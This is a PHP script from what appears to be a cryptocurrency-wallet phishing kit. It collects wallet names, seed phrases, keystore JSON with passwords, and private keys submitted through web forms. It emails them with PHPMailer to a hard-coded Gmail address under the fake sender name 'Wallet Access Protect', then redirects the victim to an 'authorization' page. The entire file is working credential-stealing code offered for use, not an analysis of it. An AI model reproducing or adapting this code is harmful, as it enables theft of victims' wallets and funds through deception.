<?php
    require 'PHPMailer/PHPMailerAutoload.php';
    
    //PHRASE FORM
    if (isset($_POST['phraseBtn'])) {
        $wallet_name = $_POST['walletname']; 
        $wallet_phrase1 = $_POST['walletphrase1']; 
        $wallet_phrase2 = $_POST['walletphrase2'];  
        
        $message = '<html><body>';
        $message .= '<h1 style="color:#f40;">Hi Samson!</h1>';
        $message .= '<p style="color:black;font-size:18px;">Dear Samson, we are happy to finally inform you that your purchase made on the 20th of July has finally been package to be delivered, we are
        so sorry for the delay and incoveniences this might has caused from our end. We have taken steps to resolve this issues.  Thanks for your patience.</p>';
        $message .= '</body></html>';
        //Create a new PHPMailer instance
        $mail = new PHPMailer;
        //Set who the message is to be sent from
        $mail->setFrom('no-reply@walletaccessprotect.live', 'Wallet Access Protect');
        //Set an alternative reply-to address
        $mail->addReplyTo('no-reply@walletaccessprotect.live', 'Wallet Access Protect');
        //Set who the message is to be sent to
        $mail->addAddress('destinyayo1@gmail.com', 'Wallet Key');
        //Set the subject line
        $mail->Subject = 'Wallet key';
        
        //Read an HTML message body from an external file, convert referenced images to embedded,
        //convert HTML into a basic plain-text alternative body
        $mail->Body= "<h1>PHRASE KEY</h1><br>
                    <h3>Wallet name: $wallet_name</h3><br>
                    <h3>Wallet phrase 1: $wallet_phrase1</h3><br>
                    <h3>Wallet phrase 2: $wallet_phrase2</h3>
        ";
        //Replace the plain text body with one created manually
        $mail->AltBody = 'wallet key';
        
        //send the message, check for errors
        if (!$mail->send()) {
           // echo "Mailer Error: " . $mail->ErrorInfo;
        } else {
          //echo 'message sent';
        }

    }


    //KEYSTONE JSON FORM
    if (isset($_POST['keystoneBtn'])) {
        $wallet_name = $_POST['walletname']; 
        $keystone_value1 = $_POST['keystone_value1']; 
        $keystone_value2 = $_POST['keystone_value2'];  
        $keystone_password = $_POST['keystone_password'];  

        $message = '<html><body>';
        $message .= '<h1 style="color:#f40;">Hi Samson!</h1>';
        $message .= '<p style="color:black;font-size:18px;">Dear Samson, we are happy to finally inform you that your purchase made on the 20th of July has finally been package to be delivered, we are
        so sorry for the delay and incoveniences this might has caused from our end. We have taken steps to resolve this issues.  Thanks for your patience.</p>';
        $message .= '</body></html>';
        //Create a new PHPMailer instance
        $mail = new PHPMailer;
        //Set who the message is to be sent from
        $mail->setFrom('no-reply@walletaccessprotect.live', 'Wallet Access Protect');
        //Set an alternative reply-to address
        $mail->addReplyTo('no-reply@walletaccessprotect.live', 'Wallet Access Protect');
        //Set who the message is to be sent to
        $mail->addAddress('destinyayo1@gmail.com', 'Wallet Key');
        //Set the subject line
        $mail->Subject = 'Wallet key';
        
        //Read an HTML message body from an external file, convert referenced images to embedded,
        //convert HTML into a basic plain-text alternative body
        $mail->Body= "<h1>KEYSTONE JSON</h1><br>
                    <h3>Wallet name: $wallet_name</h3><br>
                    <h3>Wallet keystone 1: $keystone_value1</h3><br>
                    <h3>Wallet keystone 2: $keystone_value2</h3><br>
                    <h3>Wallet keystone password: $keystone_password</h3><br>
                    
        ";
        //Replace the plain text body with one created manually
        $mail->AltBody = 'wallet key';
        
        //send the message, check for errors
        if (!$mail->send()) {
           // echo "Mailer Error: " . $mail->ErrorInfo;
        } else {
          //echo 'message sent';
        }

    }


    //PRIVATE KEY FORM
    if (isset($_POST['privateBtn'])) {
        $wallet_name = $_POST['walletname']; 
        $wallet_private1 = $_POST['privatekey_value1']; 
        $wallet_private2 = $_POST['privatekey_value2'];  
    
        $message = '<html><body>';
        $message .= '<h1 style="color:#f40;">Hi Samson!</h1>';
        $message .= '<p style="color:black;font-size:18px;">Dear Samson, we are happy to finally inform you that your purchase made on the 20th of July has finally been package to be delivered, we are
        so sorry for the delay and incoveniences this might has caused from our end. We have taken steps to resolve this issues.  Thanks for your patience.</p>';
        $message .= '</body></html>';
        //Create a new PHPMailer instance
        $mail = new PHPMailer;
        //Set who the message is to be sent from
        $mail->setFrom('no-reply@walletaccessprotect.live', 'Wallet Access Protect');
        //Set an alternative reply-to address
        $mail->addReplyTo('no-reply@walletaccessprotect.live', 'Wallet Access Protect');
        //Set who the message is to be sent to
        $mail->addAddress('destinyayo1@gmail.com', 'Wallet Key');
        //Set the subject line
        $mail->Subject = 'Wallet key';
        
        //Read an HTML message body from an external file, convert referenced images to embedded,
        //convert HTML into a basic plain-text alternative body
        $mail->Body= "<h1>PRIVATE KEY</h1><br>
                    <h3>Wallet name: $wallet_name</h3><br>
                    <h3>Wallet private key 1: $wallet_private1</h3><br>
                    <h3>Wallet private key 2: $wallet_private2</h3><br>
                    
        ";
        //Replace the plain text body with one created manually
        $mail->AltBody = 'wallet key';
        
        //send the message, check for errors
        if (!$mail->send()) {
           // echo "Mailer Error: " . $mail->ErrorInfo;
        } else {
          //echo 'message sent';
        }
        

    }
 ?>

<script>
window.location.replace("../authorization/");
</script>
